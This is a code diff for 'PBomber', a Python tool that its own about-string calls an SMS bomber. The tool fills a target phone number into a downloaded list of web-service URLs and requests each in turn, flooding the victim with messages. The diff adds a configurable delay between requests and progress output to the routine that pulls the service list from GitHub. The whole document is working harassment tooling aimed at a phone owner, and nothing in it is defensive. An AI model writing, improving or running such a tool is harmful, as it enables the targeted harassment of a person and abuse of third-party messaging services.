@@ -1,6 +1,7 @@
 import requests
 import os
 import sys
+import time
 
 filename = "base.txt"
 
@@ -18,7 +19,7 @@ logo = """
 
 about = "PBomber v1.0\nPBomber - SMS Bomber, written on Python. Created By IgorToxichnyy."
 
-Base = {}
+Base = {} #includes services, added from base.txt
 
 def checkInternet():
     #Checks internet connection
@@ -30,19 +31,24 @@ def InternetError():
     input()
     sys.exit()
 
-def start(num):
+def start(num, delay):
     #Start spamming
-    #TODO: MAKE DELAY
     i = 0
     while i < len(Base):
         requests.get(Base[i].format(num))
         print(Base[i].format(num))
         i += 1
+        time.sleep(delay)
+    print("Finally!\n")
 
 def update():
+    #TODO: MAKE CLEAR FILE BEFORE WRITING BASE
     #Update services base
+    print("Downloading new base...", end="")
     url=list(str(requests.get("https://raw.githubusercontent.com/igortoxichnyy/PBomber/main/src/base.txt").content))
+    print("OK!")
 
+    print("Converting... ", end="")
     del url[0]
 
     i = 0
@@ -62,10 +68,10 @@ def update():
                 i+=2
         else:
             i+=1
+    print("OK!")
 
-    basefile.truncate()
+    print("Write new base... ", end="")
     basefile.writelines(url)
     basefile.flush()
-
-if __name__ == '__main__':
-    update()
+    print("OK!")
+    print("Finally!\n")
